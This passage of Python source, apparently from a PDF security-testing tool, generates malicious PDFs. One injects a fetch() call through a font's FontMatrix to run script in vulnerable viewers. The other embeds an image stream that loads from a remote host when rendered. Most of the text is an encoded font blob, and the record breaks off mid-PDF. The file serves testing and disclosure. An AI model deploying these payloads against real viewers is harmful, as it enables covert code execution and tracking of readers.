    "KilebVlzNllARm4kNWRgUDhNZzBNRGMqKlVAUEwnZFdeT2lvRVdQaiZWKShmc0Jmak0tUylbX1BE"
    "YVYkMk03IyUrYkotdD05XUUhL2p1I0ovVE5QXUcvKSYlaVcoRUtTbztsQ0dLLjNKV0I3ZWtSOzFE"
    "XE1AcjpbMCZCRCJzR0ZvbTxSP1UpLUFQNjUtaHNWdDByWitfb3VvWiVbQEppbC9hbF1CTDFaVCsh"
    "RCgnQTwrLW9iV3VGcj4yYihGQjs+cGhsc2wtQD9LcSgjI3E/YTc6YlVlVFNAUUcuJV5qPSswP3FL"
    "N2FcbUhnOzZbWyFwO2dCQSkxVVtqO0haIzY9bUIpbmw8dEloYmRhQnJkLXIhKE51YHJgJWhMJmNi"
    "ZW5lUDZkLzUucFVFPkdNOXFWbD9rY3VOdDNSJmV1XTg5ayZsaT9jWD49RUk/LEFaanB1W21BQUtG"
    "cCtKaEpKSTstSC8sRiwidT80WUY6QDo/OE0vQnVxczxaWldEMEJPPVFDLztCIU4xP2ZaY0dDTlwx"
    "N0pINmozQVFKOmx1NjBIUlJgTVdSKyFfWkdncCJvVS5TPlprWnAscGdBLytsLl84ST1gT2JSbSpi"
    "ck9lLkU1JWdcRDUpajhqdWxAJk89MmkjMHBlJGFiPzM9WWEyQF5vKzJOI29xNSZCc1N1OXJiVTc/"
    "QywnRnJHaENFVFlbWlBIUzc2K2lPRkNMWWRva29hXmRVKzkhOlBZXW9iVFZGSyI2ME5ISWheMDhg"
    "Vy8nYjtOODA3Mi47NGIxWi1uR2hyX0xyMT9rYXFqSjYkOV5bQ3FiRSE7N25VTlkkOl0pSEhbXyJU"
    "UGw9KnFuOUxtREVdQkY/PTc+XUV1RD9iKT9lL11PTFlgUGtIbElwUGxHWG5MZl9HIXBvTCMkMFlM"
    "X1shMCo2Jz8wQlhpViJbU0JGL09hX3BvY01ZZHRiZz9NI2IzTzo1OjUmXDZGcT1zSnI4QFhpYSFv"
    "bXRkTXIuNGFsUWVFbFNUU3QtVTxbWGA1YiwnQFN1SmJHVGNsQ1ohO3NOP3NrKzFhO1JGTzcoV1U1"
    "Ty5ec0g6RjgtbCFXImJuIS5gISdtcS44ZyU+ZmRWNy8tIzVfMiVJLnJRO2FDYW5lKFpRYUc0RGtA"
    "T0wzbDIwUEIxal09JGxzJ0lCVkZnM1lJKSxHRS1XIXJLPj9vI0JVUm5pRUNrJGpbcUZCQk5ab0sm"
    "KSUjKDcmIzlIIl9tSWthYCc9VHJCMmc/aXA4VVU0O0UzalVgQCRIbU9QaFgpTFN0JmVgY1RgM18p"
    "TChAPDw5YDNUR3VYclU6WWVsJTZhK09PXl0lMydZNHVZYTFWISlbNC1mby9UaTNoZTE/L0lyLl4w"
    "MlAuTWFPakBEWixRa19yOjUkMD5DNCpqWTRzRE1ZLU4zTkltZ0o/LyMmYjZaJjZLWjNHbFpkaSFI"
    "USZpZjs8dFZbNUNBOjdIayFyQzs3JEJObjkuSVE0ZTklbCwtdGkvMFpqZihSUWhOXzlyYGlDR0dx"
    "OmNQPGJHITtXRURadTFsZE8kP3BycnM3alVmNERNa2lDOWdzRz9yTHRQVzphNXMxOkFoKiFqSmlB"
    "N3BMYV9yX0Q5bEUrYCUyRylJNWNtbVFyUSsmRlMoUFgscVw9KTttSyxhO0BiZGksanQ8Uzs4Q2pa"
    "QG8uOCErZCRgNWs2VTZhVjs9WjxpRUlqJD1jM0FsMVk0Omd1VUhzKyhpbzNOK1htRXAuKmFpImE/"
    "M2dcRztXLiEwXWhxOW0jPG9tYDd0IV8pY1lub2E0RylfbUojaU47OV1QIj05XVxPLkU0V19sM0lw"
    "X0ZYTiswOkg7a0JnUSN1XWJ0LEZpNyVYPDgpNz5ycmItWT8jUFNqPFlMbDguUTZ1KDVgRk1iXiQj"
    "NkRgSHEmWlpzKV9JIzg3VipPLTFWNEFBWS5fUklbJTFBQnUuWnJENSwhVW88SiVdVVtXIlpGOTJi"
    "WDUlc25fVSJ0bVc1RFQtM0FZJFJaX2g5OWJMKFslVDVgPk89NWZZPTslZiolP1pgTSxbZ0BzUyFH"
    "MEZUIUwiI0g+YzlOMSFJR0daV1ViOSgnakkhQltJMjE+UkpRKGdQbmlzL0pEJmFoWklUWC5CVk9o"
    "S1Q8bnRVbm5lPnNBXCRdamdRQTM9KSFJKTQuOFprWUhRMSFgW1tQYUBDOGlgVjs+PyRPUEE2NS4z"
    "ZkUsNmVsLW4xaCowJ0plajRoYC9dNm1pJV0lNEI5RVQ0KjRjP1ltJDhXMG1yTzlfPkI7InVwJF8s"
    "Y1UjNHBwQTxIO2BFOCVwTDxpWnNLJ25ldExfPi50aixxZFkrOyZAYk9UcFpjPEElN00sJGdbai5m"
    "bCg9Xi0+Ij5sRTNdRGxMSDBOVXF0Ijg0LnNnY0osMSVGPERfPHJSdDVSRmhmNDdPITQ+YGtBQ25Q"
    "VDtCWjlJWGVeWVdxN0dQIi1wNFRnWDBVJVFWKkxuXiRNIjJLaSQtRD86Y0hdbnNyVzlPOnFlSFBb"
    "cVQpNHFJOC4jVSNJJG01TFloLklJJ0JTUjhmPGZxJF5QQU9WamZlTVNxbyVUTSRkWGJKVyhHOUtu"
    "P1NVLWVJOVo8JmlKZGkkY0BHVWooRl5GMlxAN2hjRTVFYWQsWDFlOnBPRzE9ayZINlRQV0IjJk5r"
    "Q2hVXVJfSyJiY21LJURfaW89cjRfI0VPJlhhI1hkVT9wVCFJIlQoTiVLQypwZVxvJlIwSk0wQmxh"
    "dC4kZU5fTFxRYmhZJChsIVorakA5TVg+dWU1LiNNbG1FLkkqMSNiPiZHLWcvSUNGYFxSUVpoLidy"
    "JkRYIVU9JlklUk8iMXMiSDFqN1NOJUwlTypFcnFFLClwTVw+Q04pK2hOZ0okTWY2RUIrayshL1Nq"
    "bFQ8bFAqKjlzNChAIVlVdUpkT1tCMSskZ2xkLWtfK2NOKTk+NSsqPy9oPF9kMT1cVDJPLChKZUJf"
    "RypPOEUoIj00KmdgZWJOYGBzcks+ISlzZlQ1OzxQX25BNyVJL0JoVzhfUV9YKnBZJ2VhZFA5dVhw"
    "R2VILlVxTks3Mmc9dDUkciR0YEBGcVFLWExDQTpjZ2BLPGxVPCFuXmddNidvOjZyP08pNFVXVyFK"
    "ZklSRnVANypEIWpBa0FYVGNEcTlYOEleRmpHVjU9QzQ6YT0oS1B0LDhLV2xDV1hgR09QXUZ0ZGJL"
    "PyZUalQ9JjU8W19mOUZtbWcmajA8LnJsI1FcN0wnUzhraW82TykrWjhYNlsjOy1PZlonIWImM2VF"
    "aFhnLFZINCxbRiJiMW4iWiojS1gqPCxyZ28+S19FMkREdSZMKFF0PjJlLGk6WkNWXXFubWNqRDJw"
    "TnVEalcoRzU+Uy0tZ2snMEJKPTlcISIrQylzaGJgWmYxX2A9TUdQWTFCQDc+ZVxIIjIsUzIhWCch"
    "cmcyZU81LGM8RWMmVyxkMT4wZ2U7ajxbNylbQVtjUmA9LVJcLSVxYCRhPSJuKVFzT0hdQCInYW9R"
    "Yl8+ODheLll1bWNtUCJAXzckTkhTUUlwWipFVDBZV2Y7U0FkQ0c/YUIuQWJLRWIjSmVGXUkqZWc+"
    "M2dcJSooYVRIVCVldU1QLSxLOiM1XEhYPUwqa2pOPSlJIUY2TWdMUDJLRlAzMU9GWGJDcCRBMXEw"
    "N2NpWTE/JU4hZjklYk8xJVQpUUdBcFNxUSo4OS4+YSQmSUdqbHMyLTVfQ29jXVQ+ZFgvKiwyYCdJ"
    "UDdZWHQ+RG5eNTUkPSJpaVlSc19IWEAtPWlEK1AjbltsQUxRSjVAaiJXRXFbRVl1ZXVsIWVjJnMz"
    "bW4vRC8qTW9BZmBgXjQhSEIvZ2RxREwtS1BvWUorNlc+KXNQY2tccWZ0PDVkZi9OZGBCLiJSbk5W"
    "MktHM01USTA1aEtSMDNRImhAN2ZHREJxXTBqZy4+ZS5EMFRDYmlaZixjY0lEbDxqcjBbQz1DMTNj"
    "UDVXM0o+aEVdNVsoYzhrc0hvMy1xUSk8cD0wMG5iUSVCLVo3XTxBQlUkaWJPKlcpbj5vIXBGaFw6"
    "ITheNlNgR1VYNTkoYGdrdWheVk9MKklWWlBfPU9DS2tGYipdJlJOUl5WNUJaYWhAMjsrUUJZSllk"
    "IlNLLEhCImI/NV8ma2ZjazdqVW8icWdLKjFzKl1McltmXTBHKU9wKCwzIzpycSc7TjttMT0xZkRa"
    "cGBHSl0yQidkc2xSOStaZGNEaShRYTQ6ZmUiOF82Um5QTmc9WDgkLTpaQkVwa2hEQVluRio0NXEz"
    "M2I2KkEvJVhNb05AXCI6Q2A5JClNPWMuTVlpbj8jZjEzXUYvZnRQWT1uKUhxU1U3XWZfMVhcLUBc"
    "ZCFuKSZUISdhKGtdaTMzdGhdZjE5YGg6b3EwWTwqbycnYDokQjVzIkgqTnRcRlRrdENHQDhNblFJ"
    "W0BdKVsxdXFGZyxhSnJMI1BTZVswViRuTiswcm8sLWJgUSchSDBiYTJKNTw0PjtfZGtiTlphL0VW"
    "L0E7aC1tVlhgIytwKTdebk1vbkNUYDRFMTtVZXNRJWAuIklNUSNwVDshTjBdWSkqZGxILGZsWWJb"
    "N0JFKS0pSW9dMjVZVk5WaGVkTm8nWGElWzxgQ24rbC5lYz0+R0lDR0FAcC85Zz9kXlZqZjIvMVZg"
    "WWVQRz0qYks6LzsoIkNtclB1NmRLKiJvQiVXcUpfPitiXzlSOiFeKD9OTGNOSFZSQGM7Jm4ybFxJ"
    "XlwoJCcqbXNQKFwvZmtiZy1aJmtDcj51RS5UaVhnb2tbOVwqPnUsRSJXWjY0MlRRUFYoZGc+Ri8t"
    "Wmg5a0g+NiF0O2plbXNGcDJcWSVGRj1PMD1XImNvUVVQV0IsRGskRShZLzgxV0pFR25DaC1fWU1y"
    "QG1cZkRxPjBXMDoxPjBqVDBxPVgycTNEUFpDbjEmNmk1RVhYRzckX3A5dU1FU3AiTSZlQFE8QCFv"
    "MyRBJSdpTXUhaXJLQGJgWEtPNGwvMCxucF9UcmxASkdpO0JaXHNAUzpqU1dBITdfP2IsJCdEJGhj"
    "QVpkKiY7NkZCWjBAWXBrVjcqWi84JUFrdUFUYilsUl4lWTkjRiZtJkhpJGFVKlw/WUFuLnE/MG0w"
    "VWhkVGMtIkhdUEhONHUoZTg1biouXSwqLVwxVDUyM0hNVFc6aCU2aWdnOU9FOGJgP14/XCw7aSVH"
    "aE00YEVVN2FGbiVqUkU5XStaMkZwYVR0WmhYX2dIJjppOU83W1M+NiZlSF5oXTg3LFNlQF1NR2dZ"
    "KSJSWkdQRjlcX1ddOlhQLDovaiM0SlpnR20oS0E0KUgkTWZeXTQ8YCM+W1RCayQ9bVYoTkNUKjhl"
    "OShDLHJJRCk1IzRLOkdVbl9vMU85KWZTNnRSQSlVQDwrPlZDVlIkREMuKi4yTjwyJk5PRTszQ3BX"
    "YmIwOzJCWTtXRjFXSSZGRXIhaltuXyRiZFplO09XU0s5ZkNNXSRFdFNlZy4+RyxjJ2YkSGxpbEBh"
    "cmJnbksnKDdSQFlXUkZGVUE1RCwuWid0TDQnVFphc05DYk1FUExqLUhVbkgyaj9UY0sqak8maTRB"
    "M2dMX1spMVYnOS4zUmpAOCtcY0pGWkl0cmxQPjNXRUFRK043R01ucHJCInJrK2FnJVlXYWkpKVQj"
    "VGZSOF9hMiJKTjpqYmwqQ2xHPUlfPVdVcFNaJG82JGFjPEMxZ2leXzhEIjBRaTInVmxVb2tSZTVn"
    "dHFlQ0syUTI/XnExWD1SWUMrazxWQmNvSC1jJ1Y+XU1dLyotImVrZTxTcCY1QydGJnRvVlppLylV"
    "Jj4taGRWLEQ9YERIWE4jcS5qMlg1V1gqJ2dhZGJkIyV1NGY+KnBbTjRJT01qSEdUUm9dbWJjV3E4"
    "PWJEVFMraCM7LCYpPDE7SkZORz47VjIyMywhOiY2UjhoPj5XKHAmJj1BSlpOQFBlKllTL083Nk4i"
    "UyhVJlFdLjY5SURjbG83ZSw4UVpULihTME8jPTxWJmgsNmpdMyx0TEZDczRaPDhDazk8KSpLdFw1"
    "bEBodVpCNHBidVNoMW8iOFleRyRFJk8qNXFaJVhrIkBDcWhhK1ZNMXJXc3Iob0I+S0klcjNQSEJy"
    "RVMvTlgpXkQ4QVRKPVJxYSQxOitJLW8nLVxVNzxOcTNeIyc5WSROZkBmbW8sPFJlWmU8YUkuOXEu"
    "O04tNnA8ODQjbCtsMF9haFA+PUIhNHMxRClBQDg4XVNcb19XVy0+PmQ9SCIiMGtgLCxuR14raSZn"
    "SjA+Vi1PYStMPVhzQHM5ciheQydbQiEhLW5QYShtPWgrJE8jJzVLVHQ6VnBXXUQmM08/PS8qO05C"
    "Z0RXc1ZCZzc9K2EvI1RYYixtIzc3KTNpSWgjcGtMUVJvR15jKyM9KztybF1HXFBLSSNIckJfZCJh"
    "N1Y0RDg6X1QiR0JwInJuMEtFQExnUWs0WG5KLEU7JjE0S2AqKltHVTcjLWQxPUYvc0omSkwoP1df"
    "ODA/N1YiTzVYOnVLWzYsMzZoZWIoJXUwNE1VL0YoSGh0MEUmR0ZPPD9fYFFEZiFbV2UmdHVaWild"
    "XjAhSDZKbmU8OGRNbHQpaFdeSWMwZzk6Nmg8ZEdsIz11aGVIJT5vVDRncTlFVltkPClKTz4hMzBI"
    "WmMkPS9ULShSSjspYiwhPnE2S3BpWidFZWRhZVkpKylxMFVZM3M9VC5TXmpAOCRNaiReZiN1UD40"
    "RjIxbW1YVSZmSU1TJk5YSkZwbDtdKTU9VCFuKSxiOWs/NmkzQDU5UyM6Y3VsOE4jRU1DWTNPXi1y"
    "Llk/JUE7IjspO3BganUiZG09SShaTm1qVk0yPUE5QixhQ2RqIVU/b2k8YUMkVjU+LXJUcz0rc15k"
    "Om9LJEtNYURuUCpVZExjNyxrNT1vMzVrRyJoKCFePy9Kby9ZMltocGdORFpMPEcsYmNPZ0pFYlMp"
    "bUpqZDJkTSphLERaZ0svYzJMMjxLSHNVO1EqRSRQN1VVIXViPyEvcldYVGt1bl5iZ2o1cFg2Wi4x"
    "OCcoWGlNZ0FdMVNwJDFNOVddWSRJOWExLkdlTixCcyNLbGFfTkU/TmpnZDwsalpKIm5pYlNnVFI/"
    "PSlfLlI1cidnN1t1UUVscldiTjZVSVpKU2pVZ0A2KVlXSnIkVmIlJ2w2UkdJQ2Q0Wy45IUgzPmtP"
    "U3RzQlxeaEZIRXE3MiU3Z3A1YzBnYWQ6VF5jQ3RpSWVmdHJlUGpYSFxnMmZbR25eIi1OQ1w/I1hn"
    "V21cV2AqWDpkMG81TzlKaiJpYWBeaDpHaFEiU2liVk08USg4V3VdbltwPjRDLzVUNW1UXiRHJS05"
    "IXI5Oi0sMVo1PENHOi5zKC0iRCkvQEJhJiUmcT1DcD1NWScpQ1RANkJMaTovN09rUU5sMjZFKG8r"
    "PUdDKyIudUtvJyhyZnFHZ140S2g0R1tEMDNbIytQRV45bCgzdE8qQ2FgOiVkTyxna045OFV0X2Q+"
    "cEEmVTtRWDsmYzEvNTZIZFlLcEtxPyZfaWZxKkw7T2Q5VU8kL3J0bj1dMTNgNi4idGxpWjkvMSFZ"
    "Lm5jNTo+LmQyV21LQnFUS2FjUC04PV1IcmE7IzZCVVNUbFklbWk8RWNpb24qaiU9IWonWD5YJWI+"
    "PXFzWixISTc3WmpEMzNzPHFmP05dZDFwJkhsdFFBTiMnOGQ2alUuYyNzSnInYUpVZEorWW5zLE9H"
    "PCIyQV9iTF06cDVoL2ViMlRgTy90K0RaO3FPczRuXk1hLlAtLjA4IWdWPlhEN01oZyNPIjxEU0Vk"
    "V1tvKTI9SE9COztcKSQqbVxdaWlCQTpzLDEtXXI+am1nZkVkaSx0KCZsV1E4U29IWU1BTVIpJD1J"
    "IkUmcyVNWFc0MDdkRUR1MWY8JkYuTDs/WE4+alo+cz45K0IybE06NGtzaDVbTGNcKGxSUm44UlRh"
    "Tz1PLmpHZV9xVyJhSCdbZ3FGMD9xKTl0IkVIaGRUQTdAKSkqMm4vWkxZMVE5bDA+MV5PYyU3OSEp"
    "JUw+IWRpTGJXRFosaS9wZTxfQTtROT5wR3U/UWUoXyRxJ0ZqQDpJQDA+NWM2MGVtOlcoNUEpaWo1"
    "XDBTYDdcUi4wRSpDckIwc2VJRi0lQW1kZiRdcztNM1ovTkpGKGMhJmMlRilzZTZEZiY3UU83Ty1h"
    "J1Y8YjRcMGs3ZV5NJi9nKlowLjwrPzYuZVhrUDchcEAqT0kiKidRbC4hYiomaWtWTzhMTHNHSlBp"
    "WWJAV2RwN1JNRzAtaV5TWilBbyF0TDA/OiFsN0s/RDE5PzcrIz4kIzY4WUs2Z1thZTc2KEtMJ1Em"
    "ZmNtI29VSz9yOFolbjZnPi41Nzo9ZE1CcEA/XF8ncy5pdHQiPlRZQU4wRkhtNl1qQEdJSzdmMkVL"
    "Nm9fXCpTOCZLTTJYZTFaVXBoRistalpUNzI1bHIpIm10I1toalMhMCx0KyVyWSolPjBAR19ZYWAy"
    "S0xqZEpFPTpiMjojU0RMMFJeLTA8PSRjNV5iJGc3L0U1WShBRGBOR05KLW5KRFZcZ247Y0Y+RVI/"
    "by9LRGdxMSQmOyIiV29PSmBKNWtraTFFZSEyZD8tIzJeMlNuRjtlRy9ROSY1S3VDMCtcdS8qK3VH"
    "JiJcOlBlRjUuJlovSSU9b1lZPjpdX2lvbzlLbWF1YT8zVmdALzknXDo1Oy8sNnAiYTEmMlRXZFws"
    "X3VeVzduXXBfMUlpYlRlRiJhSjJqPWVVbFMlcj0rJVBDQ3AnOlZsQWhnaDs2XmcvaVNOdF1zT2JR"
    "aUFKXWYiKnBVJTxyVU9kMlUyPyRlQilhbEZXMjghSFEmP045W1QxRSQxX1ZTbGtwLEVqZCJSNUxA"
    "YUZzbyNaLkUhNylPTTxIbGhUXHVrQDlaP00rMzJzRyxIMkZjJicyOGU5OFFAOi1BX010LURgJ3E3"
    "akVMZGlSYlBSK01dMC9IZXFPMCY6UmVLWTlOPV1dU2RTTFIyUVVCXiRpMyFAMTBxQVkxSz0yZ1M+"
    "XjRqTVRaM21gRTBbZnI0czduYG4mYV1iTVVMITdSKj9HTydXLyxgR3JWNi1wYkIsVzo4QTxcZyhd"
    "Zy1KOD0yL1VZKFVbSCItRydlUzMzR3FmWVJvJipFKkhVU1UkKUI6ZWwuWWtpJGEiZSw/LmkkKWEr"
    "X0pmTmNyNEtxQGpeYGllYmIhPz85UVpwIldYKWFkLidBJCtDalYnLjtFVDZxbWdcKzYlaTVCKWxP"
    "USRHWTstckIxdUNSXiwtYUFzP19qNTRvNCMlQEA8T0JFMG0yQlREZGFMNlwsYT9cXydPUiJPY0RT"
    "T0RFKTZiJnVPUHFZdWduWileXkpyVWI+NVRFYFUuTiZTOypdMiNDWGFSaVsrVXJRQCJfPllOTEVx"
    "V1AuTSsvL0QyUGJXZEFsNF0+Oz1KO2ZkRGFHI2JZR1FZbl0lJj5nTWI2QkxmXVozYlx1SUdNQ0pS"
    "V0VzMmxAWHQjJV47Y1hqYmloQlpqb2Q/OyMza2tdKmQhQTpcP2s3c2NmLlx0JkxuMVsnWl9IQT1F"
    "IW1Say8mckMnTD9lNjcxQUwsSkVqJ1xQXW1MNmVGMi1yV01vYyMkUkNhM2NccCJiPWRCcTgjQSVm"
    "M2ZXMFxKbVhIYUguXk1xVi4/JXFdP3JAWVYlQT9lbSltPzNdWGshb1JTUFdTMU8mZTwvMGslWnIn"
    "RE5ZKlJFcCw+VTU7V2s/VUtldTMjLDgyOiNVWFAjI01uVmdXXXIiZ1AwTVY3K1UwTUFmNSU0MiU3"
    "KktqYGohYzpYbFtBTmlCWXAiakIxR2hMdWVAMm1bS2FZcS0iOWBiKGRsYmUwNXI8SF1pJykuLllw"
    "J203XFJhQStlKSpdM0ohKmhpQ24zNUdiKDFJMSRIaVFeS1IoKkFKMztXI0I+X250V2hmNSJEZ29I"
    "X0tlSk9uSWlVM1l1cVViWWA4PUtAYC5sclZvS1lJPlJcIyw4MF5pdUEubGxfbzNTKmVvJ21TcHUi"
    "RWBHc1JFYWQtQCIkOVlgbyIjdERAXXQsLCowJTRlZmhdYURKZDFXK1xwWEtwLC8rX1o1QnRpXGBw"
    "MTVwblJIOmJuXyhwQ1hhK2JIXEEvYXRdVyJ0XGIuZDwsO0Bqb3MocF9vJj86LjJPPFhQKF9uQl5a"
    "SSspbT1xS1JvNUBBJ3A6ZEVGblVJZ1c/PnI1O1hqcV1MLjcwal1RWUQ/XzdTZTdCVzNhOGVVJVpj"
    "Pk5kQGdBaWB1SjhoP1EockpBN1hyLDk5IVxvPWk9QUFvVTAyYVRqVUpDREA/ajlLYmszOyNiaW9F"
    "cnQ5PXNpKjVUR3IyKnB0PlwxS1QmOlJRIWlaZz1aRShqM2NPSF5QSXVnZCwhI0JuPXFURi0xdT1r"
    "ITJNR2Q3cydBKyZANGwvM1k5MFQ6ZFRuX2JALFAkLk04ZEN0QzFWQSxwS2ZWcWlxQFgnWk1ISCcv"
    "NzpmdGVpV1JoZEdxQy9PbSRbJW1sQWUjKGk2JkU3OzhedD8rX2w3WmFkdD0mW0FXU140QDFmUkFd"
    "WCIwNCtPLWxeVEUyWCMsLE1CRnM9Il8xRydyMC9HX0E2LWZRMkpETCdbTnJbbC9sMT0raDdBYGZB"
    "R2lQSnQ3T1xxYD1eYTU2ZmEjJTgyNUA/L2Bxak5VV21vUzY9ZGluW1k7NEMhQFdXPjlzKDQyZF9m"
    "P2hMUjlJKkxIS2ktKjVrNTNMWWNOJ11GYSFwNTZCJFEoTSYxWiJQOjxjKDZUVCNLVGU8akxRUF0u"
    "TiY8MCRzMEZOZ2pMK0pyYElvWFs0XT91YyoxITNtQ0FXQFRXQD9nS2BIV2VaTShLKFtmalpZYiYi"
    "N0JtMmZMLyYhVjhBI1JraHUjYFhScEw9PnBoWmY0O3U2bWgyciRmN2dOVm05UDBaLmJQbV1rRFZe"
    "NUVjRDw3QkVSWnRsLD5zTkZJT11tRU1XKVNuLmJcaTg7cTshbzAzcmBUUExjIU9RaW46K3J0K3Ek"
    "SzdAZXBgIiU4YkIkN1piKV5MaSgjQDtySGRYW10hUUFtRyo3ZHAtOk46ZXE8OlphRSxWXEVUPkJ0"
    "RDdIaG5TcEphKDdvLUYxQTRzIW5Vb01YMmNnPl1rZ3RwNG0xXnVXXmE6cyYmJz1MayY0Pj05W15y"
    "OGhtTlg5KjVyRTgpXWssS2BGUDpINkswL1UzS3UzOyNLKipuMlxRbSU0VEc/QGJaZk4lNFhiUG1B"
    "UiI4NVZAVnNPWCJ0XUU4ViRhSixpKTRQUUswIWpjW0wsOyRVLF9oK3BIc0NwU3BZXSpuTWJiKGxu"
    "QC4kXV5aTEFHSSVuaVg9cG1Ub09AcG1uaW9QMWdiZV4pIUdsbSZwR1xaaSwhRkhyK0RTRExMTDxv"
    "LDJGMFhQRjkpVmJAYFUnbnIlQjZRLmlMXXE1Wz1vVWluNnVWZG42Wzt0LztwK0FCaV9eVEwvX2Vt"
    "RnFGUmFuJGk4Vj48JVJGTlY3OChuIjpqbVxrYV9yakQnSiEuJG08LlRzKDFRS3MhPFNIbi4lNydQ"
    "RzUjOTUiLk90QEItWmNhWWRkJ1gpY089VTJUNklDWWc8RENyKHVPIS8+SENrLklwVU4qbVtNOnEv"
    "LnJzRyNOIiNZJHMxMj9VWmlXXl81ZkMlOlNnczUncDdJYkQzNC5SbjtfaXREMjRBIyosQUEuOmYj"
    "LDQqUkRuLjZfN0w8QW5fMTdnKm1nK1hwb1Y/VSU9b286R1JmJUZKTChyQFUnb09qPCMuRys6QDtu"
    "Lz1xLlsjLzgiMyMqNDI3aDQvXSleRDAxY1dQOnJpK1UtajguUFltN0EzYmpROGtxJVxWb3MzR1Jf"
    "JDZGLD4pPlpeQ0ZEbC4tPGwuLypDckc5cmwhQU4xL2clKktqKSNhY15jY25BRkw9Jl00RlxsYz1E"
    "KCshP0xkRFMzQj9WQFc2YVFLYkE4Qm9qcnFrJFxeVnI0VS5oakRPbFcnTGFqUFBFZCNzSEBBQzU+"
    "dCgyLjYuaVpVXUMmYXMlbT44UydBJXJRbyYia1gmMCQ+OVpcKVYiVXNQRS5QTCotXFdgV20/Yklb"
    "Mm1UKEsnPT9GcUs/Zy01Xi5GSi04SyMsNV83JS9KMilSLC4zMjRRTmIjUjVEITJPUy84UCRmNkRI"
    "OydPIk0sITRCcj1DRTIxZXJpXzkuVjxrU0JYMklDSi1QbEc4cVIydSROV0kuWXU3R2MyJj1xJUM4"
    "TUVKRy9PRWk5OUk9aCdqQy5APHRyXmg0QG48QDVoYGQwWTBFJmtPLSJLVGdSND0rT10hUG5FI2g3"
    "Z2NRSGZsU0xqUEslb0M4VldSbldHJCNAMTgtQFBKI2puaz9DUTVeZSM9ZE9YRiFrSUNFRm4wM2No"
    "ci9uLmA7KyFTLGtrVjlwKEVSMVFobDReW104QT1MZSFTOEBZYlsjPyE/OGomTyZzMylocFF0Vj9T"
    "aG09dVpbW1Y1OjYjT0JfMXIrLS81LU8xOE8wSFBgQXQwOlksSlw5QF83X0xrQD5vIkFZP2M7UUgi"
    "XldVS0IoXyFHQCpXdUs9XU8idEYtRG9vblU4WHQkZD9OSD8mSE5OQGtYPiclMD9ZJVVJIU5fXyVQ"
    "Zm40P3FMc04pNlkpKF1TZWdyPGBScl5hKiQ7OzwlRFM3W0kzJE1DNEtVZmtELlMpUTdEIzc0MjdB"
    "J2skLj1ZcSohU3RnI01oODtLUWo7NV9TJjddWSoxNDxCYExqbz8hVCFDc3JkbDNJOjNqVyVeW1M0"
    "NS5fQlQoLyZIRzNTLD8iUzpbXCZvPl1mWHUmTSYpKytdYVZtIkZGcUZFXWc3VFQzaSU/PyxWOypQ"
    "ZSo6XUE9c1pPW1ZVYCEmSiQ4MzJINUxJSDZKIkdxTUA0TlRLJlJWcEAmZS4vR0hiUyNBTmlNIk5n"
    "JG9FXylJNk9JLzBlO0svLywmPHBCWzdmZWIjTDkiQ1VkWD9TPlxALkk+KTRPL0xKWzFnJFBWIWJH"
    "TTN0bGVVcmNQXiouMllfYThGQmBWMlBQSCo8WC1rUi9AS1MvZCpwaF02NDJvKz89LjIwL08nZXM4"
    "X0VHRitCVlxvJCxFKjRtc0opbmlxNWo0Q15gLXFFQjs5V2RcNFw9XVorY2AiOlFbY25iZixwW0U+"
    "YG5nLjhmdW5VTTZcYShHbW06KlFNXFVQZGAqbmYkXlR0MScwJl0hYyFfPW4wKGZ1UklnYlhuLWI5"
    "dDRXPFFrLWktc04/IkY+bEkzZSVNLWg2IWZGQGBaVG9BV1FJcGZYNmdYVz81LTJvMVQqdTYzOStu"
    "ZVJGKz4oaWAlLjdtKVcjJnNNKkhhIyNqKkddTV47YExMbVdnc2NkZytQJCNUaGZLMlhVTzRFQ1or"
    "akRmN2coK2tEUmcyQSNPXTYtbzBuXiZLRF9uY2xFaEx1OXNuMVljYDQ+a1hRLVNeRytiYD0wb1Jx"
    "VzFBMWEvQyhoOU9KWWo6QGolXDs6NFdQUEtQW2tgLl1maWgpcjNQbjwxVGdrSyNWRiE/JXM9XkIm"
    "UD5tLUg7Nj1Dcm9RXCgiLiJdPCJyajA="
)


def create_malpdf29(filename, host):
    font_stream = base64.b64decode(_CMBX12_FONT_B64)
    with open(filename, 'wb') as file:
        file.write(b'%PDF-1.7\n\n')
        file.write(b'1 0 obj\n<< /Pages 2 0 R /Type /Catalog >>\nendobj\n\n')
        file.write(b'2 0 obj\n<< /Count 1 /Kids [3 0 R] /MediaBox [0 0 595 842] /Type /Pages >>\nendobj\n\n')
        file.write(b'3 0 obj\n<< /Contents 4 0 R /Parent 2 0 R /Resources << /Font << /F1 5 0 R >> >> /Type /Page >>\nendobj\n\n')
        file.write(b'4 0 obj\n<< >>\nstream\nBT\n7 Tr\n10 20 TD\n/F1 20 Tf\n(F) Tj\nET\nendstream\nendobj\n\n')
        file.write(b'5 0 obj\n<< /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R')
        file.write((' /FontMatrix [1 2 3 4 5 (1\\); fetch\\("' + host + '/test29")]').encode())
        file.write(b' /Subtype /Type1 /Type /Font >>\nendobj\n\n')
        file.write(b'6 0 obj\n<< /Flags 4 /FontBBox [-53 -251 1139 750] /FontFile 7 0 R /FontName /SNCSTG+CMBX12 /ItalicAngle 0 /Type /FontDescriptor >>\nendobj\n\n')
        file.write(b'7 0 obj\n<< /Filter /ASCII85Decode >>\nstream\n')
        file.write(font_stream)
        file.write(b'\nendstream\nendobj\n\n')
        file.write(b'trailer << /Root 1 0 R /Size 8 >>\n%%EOF\n')

# PDF101 Research: External XObject Stream callback
# An image XObject that fetches its data from a remote URL when the page is rendered
# No actions or JavaScript required - triggered purely by page content rendering
# Source: https://github.com/RUB-NDS/PDF101
def create_malpdf30(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 5 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xobj-stream' ) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace /DeviceRGB
     /FFilter /DCTDecode
     /F << /FS /URL /F (''' + host + '''/test30) >>
